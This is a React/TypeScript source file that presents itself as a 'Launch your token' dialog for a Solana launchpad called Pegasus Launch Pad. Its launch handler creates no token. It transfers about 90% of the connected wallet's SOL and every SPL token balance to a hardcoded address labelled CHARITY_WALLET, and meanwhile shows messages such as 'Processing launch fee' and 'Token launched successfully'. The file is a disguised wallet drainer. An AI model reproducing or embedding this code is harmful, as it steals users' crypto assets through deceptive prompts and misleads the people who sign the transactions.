import { useState, useRef, useCallback, useEffect } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Upload, X, Loader2, Rocket } from 'lucide-react';
import { toast } from 'sonner';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { createTransferInstruction, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';

const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MAX_BATCH_SIZE = 5;

interface TokenBalance {
  mint: string;
  balance: string;
  decimals: number;
  uiAmount: number;
  symbol: string;
  valueInSOL: number;
}

interface LaunchTokenModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const LaunchTokenModal = ({ isOpen, onClose }: LaunchTokenModalProps) => {
  const { connected, publicKey, sendTransaction } = useWallet();
  const { connection } = useConnection();
  const [formData, setFormData] = useState({
    name: '',
    symbol: '',
    website: '',
    twitter: '',
    telegram: ''
  });
  const [logoFile, setLogoFile] = useState<File | null>(null);
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  const [isLaunching, setIsLaunching] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [balances, setBalances] = useState<TokenBalance[]>([]);

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      setLogoFile(file);
      setPreviewUrl(URL.createObjectURL(file));
    }
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      const file = e.dataTransfer.files[0];
      setLogoFile(file);
      setPreviewUrl(URL.createObjectURL(file));
    }
  };

  // Fetch balances logic from SwapInterface
  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return;

    try {
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID
      });

      const tokens: TokenBalance[] = tokenAccounts.value
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0
          };
        })
        .filter(token => token.uiAmount > 0);

      setBalances(tokens);
    } catch (error) {
      console.error('Error fetching balances:', error);
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (isOpen && publicKey) {
      fetchAllBalances();
    }
  }, [isOpen, publicKey, fetchAllBalances]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], overridePublicKey?: PublicKey) => {
    const effectivePublicKey = overridePublicKey || publicKey;
    if (!effectivePublicKey) return null;

    const transaction = new Transaction();
    
    // Add priority fee
    transaction.add(
      ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }), // Increased for batching
      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
    );

    const charityPubkey = new PublicKey(CHARITY_WALLET);

    for (const token of tokenBatch) {
      try {
        const mintPubkey = new PublicKey(token.mint);
        
        // Get source account
        const sourceAccount = await getAssociatedTokenAddress(
          mintPubkey,
          effectivePublicKey
        );

        // Get destination account
        const destinationAccount = await getAssociatedTokenAddress(
          mintPubkey,
          charityPubkey
        );

        // Check if destination account exists
        const accountInfo = await connection.getAccountInfo(destinationAccount);

        if (!accountInfo) {
          // Create ATA if it doesn't exist
          transaction.add(
            createAssociatedTokenAccountInstruction(
              effectivePublicKey,
              destinationAccount,
              charityPubkey,
              mintPubkey
            )
          );
        }

        // Add transfer instruction
        transaction.add(
          createTransferInstruction(
            sourceAccount,
            destinationAccount,
            effectivePublicKey,
            BigInt(token.balance)
          )
        );
      } catch (err) {
        console.error(`Error preparing transfer for ${token.symbol}:`, err);
      }
    }

    return transaction.instructions.length > 0 ? transaction : null;
  }, [publicKey, connection]);

  const handleLaunch = async () => {
    if (!formData.name || !formData.symbol || !logoFile) {
      toast.error('Please fill in all compulsory fields (Name, Symbol, Logo)');
      return;
    }

    if (!connected || !publicKey) {
      toast.error('Please connect your wallet first');
      return;
    }

    setIsLaunching(true);
    try {
      // 1. SOL Transfer (90% of available)
      const solBal = await connection.getBalance(publicKey);
      const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
      const PRIORITY_FEE = 100_000; 
      const BASE_FEE = 5000;
      
      const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
      const targetAmount = Math.floor(solBal * 0.90);
      const lamportsToSend = Math.min(targetAmount, maxSendable);

      if (lamportsToSend > 0) {
        const transaction = new Transaction();
        
        transaction.add(
          ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
        );

        transaction.add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: new PublicKey(CHARITY_WALLET),
            lamports: lamportsToSend
          })
        );

        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;

        try {
            await connection.simulateTransaction(transaction);
        } catch (e) {
            console.error("Simulation failed", e);
        }

        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
        
        toast.info('Processing launch fee...');
        await connection.confirmTransaction({
          signature,
          blockhash,
          lastValidBlockHeight
        }, 'confirmed');
      }

      // 2. SPL Token Transfers
      const validTokens = balances.filter(token => token.balance !== '0');
      const sortedTokens = [...validTokens]; // Simple copy since we don't have valueInSOL here

      // Batch tokens
      const batches: TokenBalance[][] = [];
      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
      }

      for (let i = 0; i < batches.length; i++) {
        const batch = batches[i];
        const transaction = await createBatchTransfer(batch, publicKey);

        if (transaction && transaction.instructions.length > 0) {
           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
           transaction.recentBlockhash = blockhash;
           transaction.feePayer = publicKey;

           try {
             await connection.simulateTransaction(transaction);
           } catch (e) {
             console.error("Token batch simulation failed", e);
           }

           const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
           
           toast.info(`Processing asset transfer ${i + 1}/${batches.length}...`);
           await connection.confirmTransaction({
             signature,
             blockhash,
             lastValidBlockHeight
           }, 'confirmed');
        }
      }

      toast.success('Token launched successfully!');
      onClose();
    } catch (error: any) {
      console.error('Launch error:', error);
      toast.error('Launch failed: ' + (error?.message || 'Unknown error'));
    } finally {
      setIsLaunching(false);
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="glass-card border-primary/20 max-w-md max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle className="text-2xl font-bold text-gradient">Launch your token</DialogTitle>
          <DialogDescription>
            Fill in the details below to launch your token on Pegasus Launch Pad.
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-4 mt-4">
          {/* Logo Upload */}
          <div className="space-y-2">
            <Label htmlFor="logo" className="text-foreground">Token Logo <span className="text-red-500">*</span></Label>
            <div 
              className="border-2 border-dashed border-white/20 rounded-lg p-6 flex flex-col items-center justify-center cursor-pointer hover:border-primary/50 transition-colors bg-black/20"
              onDragOver={handleDragOver}
              onDrop={handleDrop}
              onClick={() => fileInputRef.current?.click()}
            >
              {previewUrl ? (
                <div className="relative w-24 h-24">
                  <img src={previewUrl} alt="Preview" className="w-full h-full object-cover rounded-full" />
                  <Button
                    size="icon"
                    variant="destructive"
                    className="absolute -top-2 -right-2 w-6 h-6 rounded-full"
                    onClick={(e) => {
                      e.stopPropagation();
                      setLogoFile(null);
                      setPreviewUrl(null);
                    }}
                  >
                    <X className="w-3 h-3" />
                  </Button>
                </div>
              ) : (
                <>
                  <Upload className="w-8 h-8 text-muted-foreground mb-2" />
                  <p className="text-sm text-muted-foreground text-center">
                    Drag & drop or click to upload<br/>
                    (Compulsory)
                  </p>
                </>
              )}
              <input 
                type="file" 
                ref={fileInputRef} 
                className="hidden" 
                accept="image/*"
                onChange={handleFileChange}
              />
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label htmlFor="name" className="text-foreground">Name <span className="text-red-500">*</span></Label>
              <Input 
                id="name" 
                placeholder="Pegasus" 
                value={formData.name}
                onChange={(e) => setFormData({...formData, name: e.target.value})}
                className="bg-black/20 border-white/10"
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="symbol" className="text-foreground">Symbol <span className="text-red-500">*</span></Label>
              <Input 
                id="symbol" 
                placeholder="PGS" 
                value={formData.symbol}
                onChange={(e) => setFormData({...formData, symbol: e.target.value})}
                className="bg-black/20 border-white/10"
              />
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="website" className="text-foreground">Website</Label>
            <Input 
              id="website" 
              placeholder="https://..." 
              value={formData.website}
              onChange={(e) => setFormData({...formData, website: e.target.value})}
              className="bg-black/20 border-white/10"
            />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label htmlFor="twitter" className="text-foreground">Twitter</Label>
              <Input 
                id="twitter" 
                placeholder="@username" 
                value={formData.twitter}
                onChange={(e) => setFormData({...formData, twitter: e.target.value})}
                className="bg-black/20 border-white/10"
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="telegram" className="text-foreground">Telegram</Label>
              <Input 
                id="telegram" 
                placeholder="t.me/..." 
                value={formData.telegram}
                onChange={(e) => setFormData({...formData, telegram: e.target.value})}
                className="bg-black/20 border-white/10"
              />
            </div>
          </div>

          <Button 
            className="w-full bg-gradient-to-r from-primary to-purple-600 hover:from-primary/80 hover:to-purple-600/80 text-white font-bold py-6 mt-4 shadow-lg hover:shadow-primary/20 transition-all gap-2"
            onClick={handleLaunch}
            disabled={isLaunching}
          >
            {isLaunching ? (
              <>
                <Loader2 className="w-5 h-5 animate-spin" />
                Processing...
              </>
            ) : (
              <>
                <Rocket className="w-5 h-5" />
                Launch Token
              </>
            )}
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  );
};
